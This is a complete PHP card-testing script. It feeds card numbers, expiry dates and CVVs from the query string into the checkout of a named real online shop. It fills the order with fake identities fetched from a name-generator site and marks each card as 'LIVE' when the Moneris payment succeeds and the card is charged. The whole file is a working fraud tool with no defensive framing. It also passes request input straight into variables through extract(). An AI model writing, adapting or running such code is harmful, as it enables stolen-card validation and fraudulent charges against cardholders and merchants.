<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 12)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://birdiesroom.com/shop/lanolin-conditioner',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1fwpKWHwsKR7UZTL',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "------WebKitFormBoundary1fwpKWHwsKR7UZTL\r\nContent-Disposition: form-data; name=\"quantity\"\r\n\r\n1\r\n------WebKitFormBoundary1fwpKWHwsKR7UZTL\r\nContent-Disposition: form-data; name=\"add-to-cart\"\r\n\r\n29160\r\n------WebKitFormBoundary1fwpKWHwsKR7UZTL--"
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://birdiesroom.com/checkout',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        )
    ));
    $nonce = GetStr(curl_exec($ch), 'name="woocommerce-process-checkout-nonce" value="', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://birdiesroom.com/?wc-ajax=checkout',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: application/json, text/javascript, */*; q=0.01',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "billing_first_name=$fname&billing_last_name=$lname&billing_company=&billing_country=CA&billing_address_1=$street&billing_address_2=&billing_city=$city&billing_state=BC&billing_postcode=G0E0B7&billing_phone=$phone&billing_email=$cookie@gmail.com&account_username=$cookie&account_password=$cookie&billing_birth_date=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=CA&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=PE&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flexible_shipping_17_7&payment_method=moneris&moneris-card-number=$cc&moneris-card-expiry=$mm+%2F+".substr($yy, 2 ,4)."&moneris-card-cvc=$cvv&woocommerce-process-checkout-nonce=$nonce&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
    ));
    $bitoy = curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://birdiesroom.com/checkout',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        )
    ));
    $bitoy = curl_exec($ch);
    curl_close($ch);

    $response = GetStr($bitoy, 'Payment error: ', '</li>');

    if(strpos($bitoy, '"result":"success"') || strpos($bitoy, 'Thank you. Your order has been received.')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged $29.40 CAD</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$response.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }

    unlink("$cookie.txt");
?>